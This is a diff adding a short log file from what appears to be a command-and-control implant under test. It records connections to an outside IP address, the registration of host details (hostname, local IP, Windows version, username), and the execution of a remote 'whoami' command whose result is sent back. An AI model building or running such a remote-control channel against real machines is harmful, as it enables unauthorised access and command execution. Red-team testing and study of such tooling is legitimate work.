@@ -1,0 +1,25 @@
+2025-06-11 22:32:05,572 - INFO - Connecting to C2 server at http://localhost:5000
+2025-06-11 22:32:09,639 - INFO - Shutting down implant...
+2025-06-11 22:32:23,702 - INFO - Connecting to C2 server at https://178.79.133.66:5000
+2025-06-11 22:32:24,084 - ERROR - Implant error: HTTPSConnectionPool(host='178.79.133.66', port=5000): Max retries exceeded with url: /socket.io/?transport=polling&EIO=4&t=1749673943.702074 (Caused by SSLError(SSLError(1, '[SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1007)')))
+2025-06-11 22:32:41,755 - INFO - Connecting to C2 server at http://178.79.133.66:5000
+2025-06-11 22:32:42,235 - ERROR - websocket-client package not installed, only polling transport is available
+2025-06-11 22:32:42,606 - INFO - Connected to C2 server
+2025-06-11 22:32:42,609 - INFO - Registering with C2 server: {'id': 'ec4cf8ea-8649-4cce-9dd5-bd5641c57f3e', 'hostname': 'Danbook', 'ip': '192.168.3.35', 'os': 'Windows-10-10.0.22631-SP0', 'user': 'danie'}
+2025-06-11 22:32:42,973 - INFO - Successfully registered with C2 server
+2025-06-11 22:32:57,992 - INFO - Received command: whoami
+2025-06-11 22:35:25,230 - INFO - Disconnected from C2 server
+2025-06-11 22:35:25,232 - INFO - Attempting to reconnect...
+2025-06-11 22:35:25,588 - INFO - Shutting down implant...
+2025-06-11 22:35:28,396 - INFO - Connecting to C2 server at http://178.79.133.66:5000
+2025-06-11 22:35:28,766 - ERROR - websocket-client package not installed, only polling transport is available
+2025-06-11 22:35:29,116 - INFO - Connected to C2 server
+2025-06-11 22:35:29,116 - INFO - Registering with C2 server: {'id': 'd24f7538-f82c-4913-9b46-4406f8b807f4', 'hostname': 'Danbook', 'ip': '192.168.3.35', 'os': 'Windows-10-10.0.22631-SP0', 'user': 'danie'}
+2025-06-11 22:35:29,474 - INFO - Successfully registered with C2 server
+2025-06-11 22:35:43,093 - INFO - Received command: whoami
+2025-06-11 22:35:43,093 - INFO - Executing command: whoami
+2025-06-11 22:35:43,096 - INFO - Processing command: whoami
+2025-06-11 22:35:43,096 - INFO - Executing shell command: whoami
+2025-06-11 22:35:43,174 - INFO - Command completed with return code: 0
+2025-06-11 22:35:43,174 - INFO - Command output length: 22
+2025-06-11 22:35:43,174 - INFO - Command result sent: whoami
